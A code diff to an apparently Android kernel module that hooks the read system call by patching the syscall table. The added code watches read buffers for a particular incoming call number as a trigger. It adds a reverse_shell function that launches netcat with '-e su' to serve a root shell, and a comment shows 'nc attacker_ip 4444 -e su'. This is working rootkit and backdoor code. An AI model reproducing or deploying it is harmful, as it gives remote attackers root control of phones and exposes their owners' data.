@@ -8,22 +8,57 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 
-#include <linux/unistd.h> // hooked functions: read
+#include <linux/string.h> // strstr, strcmp
 #include <linux/types.h>  // size_t
+#include <linux/unistd.h> // read, getuid
+
 
 unsigned long *sys_call_table = 0;
 
-asmlinkage ssize_t (*og_read) (int fd, void *buf, size_t count);
+asmlinkage ssize_t (*og_read) (int fd, char *buf, size_t count);
 
 asmlinkage ssize_t
-hooked_read(int fd, void *buf, size_t count)
+hooked_read(int fd, char *buf, size_t count)
 {
-  printk(KERN_INFO "syscall read has been hooked!\n");
+  if (strstr(buf, "CLCC") != NULL) {
+    if (strstr(buf, "6505551212") != NULL) {
+      printk(KERN_INFO "Trigger call\n");
+      // reverse_shell();
+    }
+  }
   return og_read(fd, buf, count);
 }
 
-void 
-get_sys_call_table()
+void
+reverse_shell(void)
+{
+  /** 
+   * Hack with netcat! 
+   * Attacker side $ nc -lvp 4444
+   * Device side $ nc attacker_ip 4444 -e su &
+   */
+  char *nc_path = "/system/xbin/nc";
+  char *args[] = {
+    "/system/xbin/nc", 
+    "127.0.0.1",
+    "4444", 
+    "-e",
+    "/system/xbin/su",
+    "&",
+    NULL
+  };
+  
+  char *env_path[] = {
+    "HOME=/",
+    "PATH=/sbin:/system/sbin:/system/bin:/system/xbin",
+    NULL
+  };
+
+  call_usermodehelper(nc_path, args, env_path, 1);
+}
+
+void
+get_sys_call_table(void)
 {
   void *swi_addr = (long *)0xffff0008;
   unsigned long offset = 0;
@@ -32,10 +67,8 @@ get_sys_call_table()
   offset = ((*(long *)swi_addr) & 0xfff) + 8;
   vector_swi_addr = *(unsigned long *)(swi_addr + offset);
 
-  while (vector_swi_addr++)
-  {
-    if (((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000)
-    {
+  while (vector_swi_addr++) {
+    if (((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000) {
       offset = ((*(unsigned long *)vector_swi_addr) & 0xfff) + 8;
       sys_call_table = (void *)vector_swi_addr + offset;
       printk(KERN_INFO "syscall table found at %p\n", sys_call_table);
@@ -48,26 +81,21 @@ get_sys_call_table()
 static int __init
 root_start(void) 
 {
-  printk(KERN_INFO "Hello word!\n");
+  /* We could use grep sys_call System.map */
   get_sys_call_table();
-  
-  if (sys_call_table != 0x0)
-  {
-    og_read = sys_call_table[__NR_read];
-    sys_call_table[__NR_read] = hooked_read;
-  }
+  if (sys_call_table == 0x0)
+    return -1; 
 
+  og_read = sys_call_table[__NR_read];
+  sys_call_table[__NR_read] = hooked_read;
+  
   return 0;
 }
 
 static int __exit
 root_stop(void)
 {
-  printk(KERN_INFO "Goodbye!\n");
-  if (sys_call_table != 0x0)
-  {
-    sys_call_table[__NR_read] = og_read;
-  }
+  sys_call_table[__NR_read] = og_read;
   return 0;
 }
 
